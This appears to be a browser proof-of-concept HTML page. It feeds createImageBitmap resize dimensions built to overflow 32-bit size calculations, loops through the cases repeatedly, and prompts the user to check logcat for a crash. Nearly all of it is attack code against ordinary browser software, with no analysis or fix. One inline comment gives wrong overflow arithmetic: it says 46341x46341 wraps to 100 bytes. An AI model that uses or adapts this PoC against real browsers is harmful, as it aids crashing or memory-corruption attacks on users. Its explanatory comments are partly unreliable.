<!DOCTYPE html>
<html>
<body>
<h1>Bitmap Overflow PoC</h1>
<pre id="log"></pre>
<script>
(async function() {
  const log = (msg) => {
    document.getElementById('log').textContent += msg + '\n';
    console.log(msg);
  };

  // Create a small source canvas
  const canvas = new OffscreenCanvas(1, 1);
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = 'red';
  ctx.fillRect(0, 0, 1, 1);
  const blob = await canvas.convertToBlob({type: 'image/png'});

  // These resize dimensions cause 32-bit integer overflows:
  //   width * height * 4 should wrap to a small non‑zero value
  const testCases = [
    {w: 32768, h: 32768},  // product 1,073,741,824 * 4 = 0 (wrap to 0)
    {w: 46341, h: 46341},  // product 2,147,488,281 * 4 = 100 bytes (wrap)
    {w: 65536, h: 65536},  // product 4,294,967,296 * 4 = 0
    {w: 1,     h: 0xFFFFFFFF}, // max unsigned 32-bit
    {w: 0x10000, h: 0x10001},  // 65536 * 65537 = 0x100010000, lower 32 bits = 0x10000, *4 = 0x40000 (262144 bytes) but dimensions huge
    {w: 0x40000000, h: 1},     // 1,073,741,824 * 1 * 4 = 4,294,967,296 (wrap to 0)
  ];

  for (let i = 0; i < 10; i++) {
    for (const test of testCases) {
      try {
        const bitmap = await createImageBitmap(blob, {
          resizeWidth: test.w,
          resizeHeight: test.h,
          resizeQuality: 'low'  // speed up
        });
        log(`OK  ${test.w}x${test.h} -> ${bitmap.width}x${bitmap.height}`);
        bitmap.close();
      } catch(e) {
        log(`ERR ${test.w}x${test.h}: ${e.message}`);
      }
      // Small delay to allow crash to propagate
      await new Promise(r => setTimeout(r, 20));
    }
  }
  log('All done. Check logcat for browser crash.');
})();
</script>
</body>
</html>
